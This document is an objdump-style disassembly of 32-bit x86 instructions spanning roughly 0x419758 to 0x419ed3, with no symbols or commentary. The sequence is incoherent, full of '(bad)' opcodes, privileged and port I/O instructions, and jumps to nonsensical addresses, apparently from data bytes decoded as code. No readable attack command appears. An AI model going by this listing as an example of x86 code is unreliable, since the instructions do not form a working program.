  419758:	bound  ebp,QWORD PTR [ecx-0x41255eb8]
  41975e:	mov    ecx,0xa6acec47
  419763:	inc    ebp
  419764:	fstp   TBYTE PTR [eax-0x6d]
  419767:	xor    BYTE PTR [eax+ebp*4],cl
  41976a:	push   ds
  41976b:	mov    bl,0xa1
  41976d:	shl    BYTE PTR [edx-0x457b54cd],0xb
  419774:	xlat   BYTE PTR ds:[ebx]
  419775:	push   ebx
  419776:	icebp  
  419777:	mov    esp,0x3565545d
  41977c:	add    edi,DWORD PTR [esi]
  41977e:	jecxz  0x41970c
  419780:	popa   
  419781:	test   DWORD PTR [edx+0x62],edi
  419784:	pusha  
  419785:	sbb    DWORD PTR [edi+0x4965d8cf],esp
  41978b:	and    bh,BYTE PTR [edi]
  41978d:	mov    dh,0x24
  41978f:	cs inc esi
  419791:	test   eax,0xab1d1f6b
  419796:	push   esp
  419797:	jae    0x419765
  419799:	hlt    
  41979a:	aaa    
  41979b:	ins    BYTE PTR es:[edi],dx
  41979c:	sbb    DWORD PTR es:[edi+ecx*2-0x1f],eax
  4197a1:	jns    0x4197ec
  4197a3:	xchg   esi,eax
  4197a4:	(bad)  
  4197a6:	jnp    0x419810
  4197a8:	dec    edi
  4197a9:	mov    dh,0xf
  4197ab:	ins    DWORD PTR es:[edi],dx
  4197ac:	inc    esi
  4197ad:	outs   dx,DWORD PTR ds:[esi]
  4197ae:	xor    bl,al
  4197b0:	jge    0x419757
  4197b2:	ins    BYTE PTR es:[edi],dx
  4197b3:	fucomp st(0)
  4197b5:	cmp    ch,dl
  4197b7:	adc    eax,0x9c5a463
  4197bc:	mov    ah,ch
  4197be:	ins    BYTE PTR es:[edi],dx
  4197bf:	repnz cwde 
  4197c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c2:	jge    0x41980e
  4197c4:	(bad)  
  4197c5:	jbe    0x41979d
  4197c7:	ja     0x419836
  4197c9:	inc    esp
  4197ca:	pop    ecx
  4197cb:	jbe    0x4197ef
  4197cd:	fstp   QWORD PTR [ebp-0x78]
  4197d0:	sub    BYTE PTR [edx],bh
  4197d2:	scas   eax,DWORD PTR es:[edi]
  4197d3:	push   eax
  4197d4:	aad    0x6
  4197d6:	retf   0xc9a2
  4197d9:	cmp    al,0xfe
  4197db:	or     ebp,DWORD PTR [ecx+0x542062d1]
  4197e1:	pop    eax
  4197e2:	(bad)  
  4197e3:	sub    DWORD PTR [ecx+eiz*2+0x6b3121ee],ebp
  4197ea:	cmp    BYTE PTR [ecx-0x4e],ch
  4197ed:	mov    esp,0x4ad14882
  4197f2:	jecxz  0x419849
  4197f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f5:	sub    bl,bh
  4197f7:	adc    BYTE PTR [ecx-0x741cf30],dh
  4197fd:	clc    
  4197fe:	add    DWORD PTR [ebp+edi*2-0x6b],esi
  419802:	dec    ebx
  419803:	fwait
  419804:	or     al,0x41
  419806:	sahf   
  419807:	stos   BYTE PTR es:[edi],al
  419808:	sbb    BYTE PTR [eax],bh
  41980a:	out    0x20,al
  41980c:	retf   
  41980d:	pop    ebx
  41980e:	jge    0x41983d
  419810:	mov    eax,ds:0xffdec524
  419815:	mov    esp,0xe3c43c57
  41981a:	scas   al,BYTE PTR es:[edi]
  41981b:	sbb    bh,BYTE PTR [edi+0x3a]
  41981e:	rol    BYTE PTR [edx],0x2a
  419821:	mov    al,0x4d
  419823:	outs   dx,DWORD PTR ds:[esi]
  419824:	fadd   QWORD PTR [eax-0xb582dfa]
  41982a:	push   edi
  41982b:	outs   dx,DWORD PTR ds:[esi]
  41982c:	mov    DWORD PTR [eax-0x5c],ebp
  41982f:	sbb    DWORD PTR ds:0xf93577c0,0x45184526
  419839:	iret   
  41983a:	or     edi,esi
  41983c:	int    0xeb
  41983e:	sbb    eax,0x21460101
  419843:	mov    al,0x64
  419845:	push   edx
  419846:	shl    DWORD PTR [esp+ecx*8+0x15],cl
  41984a:	call   0xa4da16ef
  41984f:	pop    ds
  419850:	xchg   ebp,eax
  419851:	pop    edi
  419852:	xchg   dx,ax
  419854:	and    DWORD PTR [esi],esi
  419856:	add    al,0x73
  419858:	dec    eax
  419859:	call   0x1ab26856
  41985e:	cs pop esi
  419860:	mov    esi,0x6273d92c
  419865:	mov    cl,dl
  419867:	push   esp
  419868:	sbb    bl,cl
  41986a:	add    eax,0xff1def8
  41986f:	add    DWORD PTR [eax+ecx*2+0x77],ebp
  419873:	ss and cl,bl
  419876:	je     0x4198ce
  419878:	pop    ds
  419879:	mov    ecx,0x2c1d375
  41987e:	mov    edx,esp
  419880:	pop    es
  419881:	jecxz  0x419877
  419883:	imul   ecx,DWORD PTR [ebp-0x61],0xf
  419887:	jmp    DWORD PTR [esi]
  419889:	shl    DWORD PTR [esi],0x37
  41988c:	aad    0x5a
  41988e:	mov    DWORD PTR [edi-0x44ae7ddf],edx
  419894:	ds jno 0x4198e0
  419897:	cmc    
  419898:	leave  
  419899:	les    ebp,FWORD PTR [edx-0x74f91cd8]
  41989f:	inc    edi
  4198a0:	dec    ebx
  4198a1:	stos   BYTE PTR es:[edi],al
  4198a2:	push   edi
  4198a3:	adc    dh,BYTE PTR [ebp-0x44dd7068]
  4198a9:	sub    bl,BYTE PTR [esi+ebx*8+0xac8da27]
  4198b0:	xchg   edi,eax
  4198b1:	cmc    
  4198b2:	ficomp DWORD PTR [ecx]
  4198b4:	xchg   ebx,eax
  4198b5:	push   ecx
  4198b6:	(bad)  
  4198b7:	add    eax,0xa22e62fb
  4198bc:	cmc    
  4198bd:	shr    BYTE PTR [ebx],1
  4198bf:	seto   BYTE PTR [ecx-0x1a396a4d]
  4198c6:	inc    eax
  4198c7:	sub    esi,DWORD PTR [edi+0x5b]
  4198ca:	dec    edx
  4198cb:	cdq    
  4198cc:	inc    esi
  4198cd:	fstp   QWORD PTR [ecx]
  4198cf:	and    ecx,DWORD PTR [esi+0x3fa8b9f6]
  4198d5:	add    dh,BYTE PTR [esi-0x75ff3a94]
  4198db:	sbb    BYTE PTR [ecx+esi*2-0x34],ah
  4198df:	enter  0x3006,0x8b
  4198e3:	cmp    al,0x94
  4198e5:	add    al,0x8
  4198e7:	cmp    al,0xa4
  4198e9:	mov    ah,0xb5
  4198eb:	rcl    BYTE PTR [esi-0x50],1
  4198ee:	lods   al,BYTE PTR ds:[esi]
  4198ef:	fcomp  DWORD PTR [esi+0x6d6bafbf]
  4198f5:	xchg   esp,eax
  4198f6:	ret    
  4198f7:	or     BYTE PTR [edx],0xb8
  4198fa:	icebp  
  4198fb:	aad    0xb5
  4198fd:	xor    eax,0x2eba9472
  419902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419903:	in     eax,dx
  419904:	mov    ?,edi
  419906:	xchg   edx,eax
  419907:	hlt    
  419908:	int3   
  419909:	outs   dx,BYTE PTR ds:[esi]
  41990a:	js     0x419898
  41990c:	mov    bh,0xac
  41990e:	mov    esp,0xca3a7a60
  419913:	mov    dh,BYTE PTR [eax+0x5b]
  419916:	jns    0x41996a
  419918:	mov    esp,0xe80b6974
  41991d:	adc    BYTE PTR [eax],ch
  41991f:	xor    dh,cl
  419921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419922:	out    dx,eax
  419923:	xchg   ecx,eax
  419924:	lea    di,[esi+0x1]
  419928:	xor    eax,DWORD PTR [edx]
  41992a:	repnz iret 
  41992c:	(bad)  
  41992d:	ins    DWORD PTR es:[edi],dx
  41992e:	jbe    0x4198e7
  419930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419931:	adc    BYTE PTR ds:0x2da90867,dh
  419937:	test   al,0xc4
  419939:	sbb    ch,BYTE PTR [edx+0x20]
  41993c:	stc    
  41993d:	retf   
  41993e:	jecxz  0x41999c
  419940:	adc    al,0x3b
  419942:	pop    es
  419943:	std    
  419944:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  419946:	shr    esp,0x3e
  419949:	xor    al,0xca
  41994b:	cmp    cl,BYTE PTR [edi+0x38]
  41994e:	not    BYTE PTR [ebx+0x65]
  419951:	inc    edx
  419952:	mov    edi,es
  419954:	cmp    DWORD PTR [eax-0x39],edx
  419957:	and    ebx,0xffffffb3
  41995a:	sahf   
  41995b:	fwait
  41995c:	arpl   di,sp
  41995e:	arpl   si,cx
  419960:	jg     0x419932
  419962:	test   ah,cl
  419964:	fdiv   QWORD PTR [edi]
  419966:	test   BYTE PTR [eax+0x32],ah
  419969:	pop    ebp
  41996a:	das    
  41996b:	rol    BYTE PTR [ebx+0x7f],0xf4
  41996f:	cmp    al,0xd6
  419971:	repnz push edx
  419973:	mov    DWORD PTR [edi+0x1],edi
  419976:	push   eax
  419977:	xor    BYTE PTR [esi-0x6e69ee74],ch
  41997d:	outs   dx,BYTE PTR ds:[esi]
  41997e:	(bad)  
  41997f:	xchg   ebp,eax
  419980:	and    bl,BYTE PTR [edx-0x35cbbec3]
  419986:	pop    esp
  419987:	bnd jl 0x419990
  41998a:	ret    0xfe94
  41998d:	nop    DWORD PTR [edx-0x8]
  419991:	pop    ss
  419992:	xchg   ebp,eax
  419993:	mov    ecx,0xad8f5fe3
  419998:	je     0x4199a4
  41999a:	pop    esi
  41999b:	pusha  
  41999c:	cwde   
  41999d:	sub    ecx,edi
  41999f:	stos   DWORD PTR es:[edi],eax
  4199a0:	xor    eax,0x1d39d6e0
  4199a5:	xchg   ebx,eax
  4199a6:	popf   
  4199a7:	xor    ebp,0x464bf211
  4199ad:	jmp    0x70f8:0x196c8e9d
  4199b4:	pop    ebx
  4199b5:	pop    ebp
  4199b6:	mov    dl,0x1a
  4199b8:	inc    eax
  4199b9:	or     al,0xb0
  4199bb:	adc    DWORD PTR [edx],ecx
  4199bd:	xchg   ebp,eax
  4199be:	mov    WORD PTR [esi+0x74525bbb],es
  4199c4:	dec    ebp
  4199c5:	das    
  4199c6:	(bad)  
  4199c7:	les    eax,FWORD PTR [ebp-0x56bdf39a]
  4199cd:	cmc    
  4199ce:	mov    ecx,?
  4199d0:	inc    esi
  4199d1:	mov    bl,BYTE PTR [ecx]
  4199d3:	rcr    BYTE PTR [edx-0x6e],0x49
  4199d7:	in     al,dx
  4199d8:	js     0x419a31
  4199da:	fiadd  DWORD PTR [eax]
  4199dc:	fstp   TBYTE PTR [ebx-0x5e]
  4199df:	iret   
  4199e0:	jmp    0x419979
  4199e2:	les    ecx,FWORD PTR [ebp-0x66]
  4199e5:	xor    cl,ch
  4199e7:	and    DWORD PTR ds:0x976378a1,esi
  4199ed:	fwait
  4199ee:	test   BYTE PTR [edi+0x1],ah
  4199f1:	and    dh,BYTE PTR [esi-0x40]
  4199f4:	pop    ss
  4199f5:	aad    0xa5
  4199f7:	je     0x419a28
  4199f9:	mov    ds:0x1f3c47ae,eax
  4199fe:	repnz fs add al,0x89
  419a02:	mov    ds:0xcdcd20bb,al
  419a07:	and    esp,DWORD PTR [ecx]
  419a09:	inc    edx
  419a0a:	adc    bl,bl
  419a0c:	xor    BYTE PTR [edx-0x79],ch
  419a0f:	push   edx
  419a10:	push   eax
  419a11:	repz sub al,0xbc
  419a14:	ins    BYTE PTR es:[edi],dx
  419a15:	outs   dx,BYTE PTR ds:[esi]
  419a16:	lahf   
  419a17:	repz push cx
  419a1a:	loop   0x4199f1
  419a1c:	xor    dl,BYTE PTR [eax+ebx*1]
  419a1f:	lea    edi,[eax+0x39]
  419a22:	pop    ds
  419a23:	out    dx,al
  419a24:	(bad)  
  419a26:	jp     0x419a6f
  419a28:	xchg   ebp,esp
  419a2a:	(bad)  
  419a2b:	push   ebp
  419a2c:	cmp    DWORD PTR [edx+0x37],edx
  419a2f:	pusha  
  419a30:	rol    DWORD PTR [ebp-0x1901f768],1
  419a36:	xor    al,0x7a
  419a38:	lahf   
  419a39:	(bad)  
  419a3a:	into   
  419a3b:	aas    
  419a3c:	add    DWORD PTR [eax],edi
  419a3e:	rcr    DWORD PTR [ebp+0x3d7c92b1],1
  419a44:	ins    DWORD PTR es:[edi],dx
  419a45:	int    0x9e
  419a47:	xchg   esi,eax
  419a48:	mov    eax,0x459c566c
  419a4d:	cmp    ebp,ebp
  419a4f:	inc    edx
  419a50:	stc    
  419a51:	mov    eax,ds:0xd4dbf989
  419a56:	shl    BYTE PTR [edi],cl
  419a58:	ja     0x419ac6
  419a5a:	mov    ds:0xf68af3bc,al
  419a5f:	mov    BYTE PTR [ecx+0x5d],0x84
  419a63:	das    
  419a64:	(bad)  
  419a65:	je     0x419a7d
  419a67:	fs dec ebp
  419a69:	cmp    DWORD PTR [edx-0x374c9877],esp
  419a6f:	scas   eax,DWORD PTR es:[edi]
  419a70:	pop    eax
  419a71:	or     al,0x95
  419a73:	fdivr  DWORD PTR [ebp-0x6c144633]
  419a79:	out    dx,al
  419a7a:	adc    eax,0x6b71e035
  419a7f:	shl    BYTE PTR [edi-0x63f777a6],cl
  419a85:	popf   
  419a86:	xchg   ecx,eax
  419a87:	sub    dh,bh
  419a89:	fistp  QWORD PTR [edx-0x55]
  419a8c:	rol    DWORD PTR [ecx-0x1896f926],cl
  419a92:	push   eax
  419a93:	xchg   ecx,ecx
  419a95:	leave  
  419a96:	cdq    
  419a97:	lock mov fs,WORD PTR [ebx+0x2bf18129]
  419a9e:	push   esi
  419a9f:	outs   dx,BYTE PTR ds:[esi]
  419aa0:	dec    esi
  419aa1:	pop    ebx
  419aa2:	sbb    ch,BYTE PTR [edi+ecx*8]
  419aa5:	inc    edx
  419aa6:	jge    0x419a90
  419aa8:	cmp    BYTE PTR [eax+0x7d],dl
  419aab:	retf   
  419aac:	add    DWORD PTR [edi],edi
  419aae:	jno    0x419ae1
  419ab0:	in     eax,0x2a
  419ab2:	fcmovnb st,st(1)
  419ab4:	add    al,0x10
  419ab6:	or     al,0xc6
  419ab8:	cwde   
  419ab9:	rcl    DWORD PTR [eax],1
  419abb:	outs   dx,DWORD PTR ds:[esi]
  419abc:	ficom  WORD PTR [edi-0x6d]
  419abf:	sahf   
  419ac0:	mov    ds,WORD PTR [ebx]
  419ac2:	mov    ebp,0x63317b13
  419ac7:	pop    ebp
  419ac8:	adc    eax,0xc61e9e0b
  419acd:	xchg   esp,eax
  419ace:	in     eax,dx
  419acf:	repnz or BYTE PTR [ecx],al
  419ad2:	sub    eax,0x5611b116
  419ad7:	rol    DWORD PTR [edi],cl
  419ad9:	sub    BYTE PTR [edx],0x7d
  419adc:	stos   DWORD PTR es:[edi],eax
  419add:	leave  
  419ade:	mov    ds:0x14dfd58c,al
  419ae3:	jnp    0x419aeb
  419ae5:	xor    eax,0x98e31855
  419aea:	xchg   DWORD PTR [ebx+ebp*8],edi
  419aed:	inc    ebp
  419aee:	fisub  DWORD PTR [ecx+0x24]
  419af1:	adc    eax,0xbc9f713c
  419af6:	or     BYTE PTR [ecx-0x19],0x13
  419afa:	mov    ch,0x7
  419afc:	fisub  WORD PTR ds:0x9a583622
  419b02:	(bad)  
  419b03:	scas   eax,DWORD PTR es:[edi]
  419b04:	es add al,0x6d
  419b07:	pop    edx
  419b08:	adc    dh,0xb6
  419b0b:	adc    al,bh
  419b0d:	cs inc ebp
  419b0f:	ins    BYTE PTR es:[edi],dx
  419b10:	in     eax,dx
  419b11:	bound  esi,QWORD PTR [ecx+0x8f5bec4]
  419b17:	cdq    
  419b18:	mov    edi,0x9acc346a
  419b1d:	dec    edx
  419b1e:	mov    eax,0x1467da31
  419b23:	mov    ds,ebp
  419b25:	das    
  419b26:	add    ecx,esp
  419b28:	pop    esp
  419b29:	adc    al,0x9
  419b2b:	jle    0x419b78
  419b2d:	adc    dh,bl
  419b2f:	adc    al,0x64
  419b31:	mov    fs,WORD PTR [edx-0x3]
  419b34:	mov    edi,0x3f5c8025
  419b39:	mov    al,0x9c
  419b3b:	daa    
  419b3c:	cmp    DWORD PTR [ebp+edx*2-0xe11938b],ebx
  419b43:	cmc    
  419b44:	mov    ss,WORD PTR [ebp-0x3ec98c4]
  419b4a:	push   ebx
  419b4b:	jae    0x419b97
  419b4d:	pop    DWORD PTR [edi-0x604e7a0f]
  419b53:	xlat   BYTE PTR ds:[ebx]
  419b54:	mov    ecx,0xb9a2234d
  419b59:	push   ss
  419b5a:	mov    eax,DWORD PTR ds:0x13348c8e
  419b60:	push   cs
  419b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b62:	push   cs
  419b63:	adc    al,0x67
  419b65:	cmc    
  419b66:	mov    ds:0x5eece554,eax
  419b6b:	mov    edx,0x9bad8f6b
  419b70:	cmp    eax,DWORD PTR [edi-0x57]
  419b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b74:	inc    ebx
  419b75:	push   esi
  419b76:	sbb    BYTE PTR [ebp+edi*4-0x505c5db2],0x30
  419b7e:	shl    DWORD PTR [edi-0x62],cl
  419b81:	jnp    0x419b38
  419b83:	rcr    ebx,1
  419b85:	loop   0x419bf7
  419b87:	cmp    BYTE PTR [ebp-0x6d3c3326],al
  419b8d:	adc    al,0xbb
  419b8f:	push   eax
  419b90:	in     al,dx
  419b91:	jno    0x419b50
  419b93:	sub    BYTE PTR [ecx],dl
  419b95:	call   0x897b:0xa21f154e
  419b9c:	adc    dh,BYTE PTR [ebp+ebp*4-0xd76ee8]
  419ba3:	ins    DWORD PTR es:[edi],dx
  419ba4:	pop    esi
  419ba5:	int    0x98
  419ba7:	xchg   esi,eax
  419ba8:	stc    
  419ba9:	out    0x90,al
  419bab:	xor    al,0x72
  419bad:	cmp    DWORD PTR [esi+ecx*1],esp
  419bb0:	out    dx,al
  419bb1:	pop    es
  419bb2:	repz add dl,BYTE PTR [ebp+0x2]
  419bb6:	ins    DWORD PTR es:[edi],dx
  419bb7:	jo     0x419c15
  419bb9:	mov    al,ds:0x408b8f70
  419bbe:	cmc    
  419bbf:	popa   
  419bc0:	or     al,0x82
  419bc2:	mov    bh,0x9b
  419bc4:	add    ch,BYTE PTR [edi+0x4f456db0]
  419bca:	es mov ebp,0xc2c43a2f
  419bd0:	loope  0x419b57
  419bd2:	xor    al,0x9f
  419bd4:	cwde   
  419bd5:	add    al,dh
  419bd7:	ins    BYTE PTR es:[edi],dx
  419bd8:	shr    BYTE PTR ds:0x3738d85e,1
  419bde:	mov    eax,0x6a524dd5
  419be3:	sbb    al,0xfe
  419be5:	ds pop edx
  419be7:	jge    0x419c2c
  419be9:	jbe    0x419bab
  419beb:	and    eax,0xb901e269
  419bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf1:	and    al,0x1e
  419bf3:	retf   0x7e4c
  419bf6:	jl     0x419c5a
  419bf8:	jmp    0x419c19
  419bfa:	mov    ch,0xae
  419bfc:	stos   BYTE PTR es:[edi],al
  419bfd:	sbb    BYTE PTR [ecx+0x78814e72],ah
  419c03:	cs adc ch,al
  419c06:	mov    BYTE PTR [edi+esi*1+0x5a],0xf8
  419c0b:	xchg   esi,eax
  419c0c:	lahf   
  419c0d:	cmp    BYTE PTR [eax],ch
  419c0f:	test   edi,eax
  419c11:	pusha  
  419c12:	pop    ebp
  419c13:	ins    DWORD PTR es:[edi],dx
  419c14:	je     0x419bff
  419c16:	lea    eax,[ecx-0x5f]
  419c19:	sbb    al,0x20
  419c1b:	push   0x2c
  419c1d:	add    BYTE PTR [edx-0x1b],bh
  419c20:	jbe    0x6c44ff0a
  419c26:	mov    dl,0x68
  419c28:	dec    eax
  419c29:	push   ebp
  419c2a:	(bad)  
  419c2b:	iret   
  419c2c:	jno    0x419c49
  419c2e:	arpl   WORD PTR [eax+0x65],di
  419c31:	pop    eax
  419c32:	test   BYTE PTR [esi-0x5b],dl
  419c35:	jmp    0x419c5d
  419c37:	imul   esi,DWORD PTR [ecx-0x23e0d6e8],0xffffffce
  419c3e:	mov    ch,BYTE PTR [eax+0x6e327ee3]
  419c44:	daa    
  419c45:	adc    DWORD PTR [eax],ecx
  419c47:	sbb    DWORD PTR [edx-0x49ea8264],esi
  419c4d:	mov    ebx,0x480a95df
  419c52:	mov    WORD PTR [eax-0x625a3fa3],?
  419c58:	fisub  WORD PTR [ecx-0x4355863d]
  419c5e:	cmp    al,0x10
  419c60:	inc    eax
  419c61:	(bad)  
  419c63:	mov    edx,0x229596be
  419c68:	bound  ebx,QWORD PTR [ecx]
  419c6a:	es call 0xeb6:0xdd8fb51c
  419c72:	and    DWORD PTR [ebx],eax
  419c74:	fwait
  419c75:	or     DWORD PTR [ecx-0xac784a],ebp
  419c7b:	mov    edx,0xbe0d330b
  419c80:	pop    esi
  419c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c82:	sar    dh,cl
  419c84:	adc    al,cl
  419c86:	push   eax
  419c87:	mov    al,0x8d
  419c89:	pop    eax
  419c8a:	fistp  QWORD PTR [ecx]
  419c8c:	mov    cl,0x82
  419c8e:	push   es
  419c8f:	fs repz in al,0xa5
  419c93:	add    ecx,edx
  419c95:	xchg   edx,eax
  419c96:	push   esp
  419c97:	sub    al,0xb3
  419c99:	rol    BYTE PTR [ecx-0x33],cl
  419c9c:	cmp    edx,DWORD PTR [ecx-0x61]
  419c9f:	jmp    0xc0ef64d1
  419ca4:	ret    0x466a
  419ca7:	jbe    0x419c2b
  419ca9:	out    dx,al
  419caa:	xchg   edi,eax
  419cab:	pop    ss
  419cac:	inc    eax
  419cad:	sbb    eax,0x5d8f9a35
  419cb2:	cmp    eax,edx
  419cb4:	fdivr  DWORD PTR [esi-0x7f74da4a]
  419cba:	es cwde 
  419cbc:	dec    edx
  419cbd:	ins    BYTE PTR es:[di],dx
  419cbf:	pop    esi
  419cc0:	push   ds
  419cc1:	ds icebp 
  419cc3:	loopne 0x419ca4
  419cc5:	mov    bl,0x22
  419cc7:	les    ebp,FWORD PTR [esi]
  419cc9:	pushf  
  419cca:	(bad)  
  419ccb:	dec    ebx
  419ccc:	rcl    BYTE PTR [edi+eiz*1+0x3492da31],cl
  419cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd4:	aad    0x7b
  419cd6:	dec    edx
  419cd7:	mov    eax,0x8148896d
  419cdc:	mov    al,ds:0x1885169b
  419ce1:	jo     0x419d06
  419ce3:	call   0xe0be91b6
  419ce8:	mov    bh,0xa6
  419cea:	(bad)  
  419ceb:	cmp    BYTE PTR [eax+ebp*8-0x29],dh
  419cef:	rcr    BYTE PTR [ebx],1
  419cf1:	(bad)  
  419cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cf3:	addr16 mov ecx,0xcd1657fd
  419cf9:	mov    dl,0xec
  419cfb:	aaa    
  419cfc:	sbb    cl,BYTE PTR [esp+edi*1-0x3791ed23]
  419d03:	inc    ebp
  419d04:	jl     0x419ca7
  419d06:	add    esp,eax
  419d08:	dec    ecx
  419d09:	push   0xffffff89
  419d0b:	push   ecx
  419d0c:	xchg   BYTE PTR ds:0x134ce138,cl
  419d12:	sbb    ch,BYTE PTR [esi-0x3c]
  419d15:	jmp    0xc16da4b5
  419d1a:	add    DWORD PTR [edi],ebp
  419d1c:	dec    esp
  419d1d:	je     0x419d55
  419d1f:	sub    DWORD PTR [edi-0x35],edx
  419d22:	clc    
  419d23:	std    
  419d24:	add    esp,ecx
  419d26:	xchg   edi,eax
  419d27:	rep lods al,BYTE PTR ds:[esi]
  419d29:	js     0x419cf7
  419d2b:	pop    eax
  419d2c:	mov    DWORD PTR [ebp+0x5d],ecx
  419d2f:	ja     0x419da2
  419d31:	mov    ds:0xce8e3b86,al
  419d36:	xor    eax,0xd60bce37
  419d3b:	mov    al,0x21
  419d3d:	jle    0x419d87
  419d3f:	mov    esp,0xb79fdde9
  419d44:	call   0xe53e8156
  419d49:	push   ebx
  419d4a:	pop    eax
  419d4b:	and    DWORD PTR [ecx+0x6d],0xffffffeb
  419d4f:	call   0xc70b:0xbf2973a7
  419d56:	push   ebx
  419d57:	xchg   DWORD PTR [ecx+0x1922e934],ecx
  419d5d:	ss scas eax,DWORD PTR es:[edi]
  419d5f:	mov    BYTE PTR [edx],dh
  419d61:	add    al,0x13
  419d63:	xor    bh,BYTE PTR [ebx-0x38a8d84b]
  419d69:	xchg   ebx,eax
  419d6a:	in     eax,dx
  419d6b:	dec    eax
  419d6c:	js     0x419d3f
  419d6e:	pop    ebx
  419d6f:	xor    bl,BYTE PTR [esp+ecx*4+0x75]
  419d73:	fidivr WORD PTR [ebx+eiz*2+0x7c17ddd9]
  419d7a:	ret    0xe8d
  419d7d:	(bad)  
  419d7e:	imul   esp,ebx,0x2572e60d
  419d84:	imul   edi,DWORD PTR [ebx+0x71666b6],0xcfb26b0d
  419d8e:	sub    eax,0xe32e3df6
  419d93:	add    BYTE PTR [esi-0x7adb8ffd],ah
  419d99:	jle    0x419def
  419d9b:	push   edx
  419d9c:	push   0x2c
  419d9e:	cs jg  0x419dc6
  419da1:	cmp    BYTE PTR [ebp+0x1349afdc],cl
  419da7:	pop    eax
  419da8:	in     al,0xa1
  419daa:	sub    DWORD PTR [esi+0x4e],ecx
  419dad:	cwde   
  419dae:	mov    edx,0x72ca9e8c
  419db3:	push   esi
  419db4:	cmp    al,0x73
  419db6:	outs   dx,DWORD PTR ds:[esi]
  419db7:	lods   al,BYTE PTR ds:[esi]
  419db8:	neg    DWORD PTR [ebp+0x7eb56c08]
  419dbe:	inc    esp
  419dbf:	adc    al,0x75
  419dc1:	stc    
  419dc2:	sar    BYTE PTR [edx],1
  419dc4:	jno    0x419d75
  419dc6:	inc    ebp
  419dc7:	pop    edi
  419dc8:	add    DWORD PTR [ebx+0x4],0x2f
  419dcc:	push   0xef07a710
  419dd1:	xor    dl,BYTE PTR [esi-0x7876cd50]
  419dd7:	aas    
  419dd8:	imul   edx,DWORD PTR [edx],0x2e71d136
  419dde:	jp     0x419ded
  419de0:	pop    ebx
  419de1:	inc    ebp
  419de2:	je     0x419d70
  419de4:	cmp    DWORD PTR [ebp+0x34],0xffffffd3
  419de8:	sbb    BYTE PTR [ebx+ebp*4-0x5a],0x80
  419ded:	xchg   DWORD PTR [eax+0x6f],ebx
  419df0:	fwait
  419df1:	ret    0x6a6f
  419df4:	dec    edx
  419df5:	add    eax,0x668eb426
  419dfa:	cmp    esi,DWORD PTR [edx]
  419dfc:	mov    ch,0x52
  419dfe:	dec    ebp
  419dff:	lods   eax,DWORD PTR ds:[esi]
  419e00:	jge    0x419d9c
  419e02:	sub    eax,0x78e8cbd8
  419e07:	loop   0x419dd8
  419e09:	fistp  DWORD PTR [edi+0x1a]
  419e0c:	aaa    
  419e0d:	fidiv  DWORD PTR [eax]
  419e0f:	or     DWORD PTR [ecx],eax
  419e11:	(bad)  
  419e12:	jo     0x419e31
  419e14:	repz mov ah,0x2a
  419e17:	xchg   edi,eax
  419e18:	out    0xda,al
  419e1a:	inc    eax
  419e1b:	(bad)  
  419e1c:	repz cld 
  419e1e:	push   eax
  419e1f:	inc    eax
  419e20:	xlat   BYTE PTR ds:[ebx]
  419e21:	(bad)  
  419e22:	jl     0x419e14
  419e24:	or     ebx,esi
  419e26:	push   ecx
  419e27:	sbb    esp,DWORD PTR [edx]
  419e29:	sub    BYTE PTR [ebx+0x21],bl
  419e2c:	inc    ebp
  419e2d:	iret   
  419e2e:	repz pop edx
  419e30:	loope  0x419e54
  419e32:	mul    bl
  419e34:	jecxz  0x419dbd
  419e36:	pop    eax
  419e37:	bound  edi,QWORD PTR ss:[eax+0x66]
  419e3b:	cmc    
  419e3c:	cwde   
  419e3d:	or     ah,dl
  419e3f:	mul    al
  419e41:	or     al,0x6d
  419e43:	mov    eax,0xf1cfd5b4
  419e48:	mov    ds:0x6ebf2447,al
  419e4d:	loop   0x419ecd
  419e4f:	or     ebp,DWORD PTR [edi-0x35eb4e61]
  419e55:	test   BYTE PTR cs:[esi+0x56433a46],bh
  419e5c:	push   ebp
  419e5d:	and    eax,0x386c7c7b
  419e62:	hlt    
  419e63:	fisttp WORD PTR [ebx]
  419e65:	xchg   esp,eax
  419e66:	in     eax,dx
  419e67:	repz scas al,BYTE PTR es:[edi]
  419e69:	mov    edi,0x1a0ed824
  419e6e:	sbb    DWORD PTR [edx],eax
  419e70:	adc    ecx,DWORD PTR [ebp+0x32bbc537]
  419e76:	xor    ecx,ecx
  419e78:	add    BYTE PTR [esi+edi*1+0x6f8cf17a],dl
  419e7f:	xor    DWORD PTR [ebp+0x6b93a2e],esi
  419e85:	loopne 0x419e0d
  419e87:	sbb    dl,BYTE PTR ds:0x87905e97
  419e8d:	cld    
  419e8e:	adc    BYTE PTR [edi],bh
  419e90:	cli    
  419e91:	stos   BYTE PTR es:[edi],al
  419e92:	out    dx,eax
  419e93:	call   0xb327bd6d
  419e98:	mov    ebx,0xc7b9653b
  419e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e9e:	push   edx
  419e9f:	leave  
  419ea0:	dec    esi
  419ea1:	mov    dh,0x1f
  419ea3:	push   0x1ce5c89
  419ea8:	jo     0x419f06
  419eaa:	sub    DWORD PTR ds:0xc270725,ebx
  419eb0:	nop
  419eb1:	sub    DWORD PTR [ebp+0xd6c690d],esp
  419eb7:	out    0x57,eax
  419eb9:	sbb    bh,dl
  419ebb:	cmp    al,0xd8
  419ebd:	mov    bh,BYTE PTR [ebx-0x19]
  419ec0:	fwait
  419ec1:	sbb    BYTE PTR [ebp-0x17],ah
  419ec4:	push   cs
  419ec5:	out    dx,eax
  419ec6:	mov    bl,BYTE PTR [ecx+edi*1]
  419ec9:	fs in  eax,0x38
  419ecc:	sar    DWORD PTR [ebp+0x17],1
  419ecf:	xchg   edi,eax
  419ed0:	mov    ch,0x6b
  419ed2:	pop    ebp
  419ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
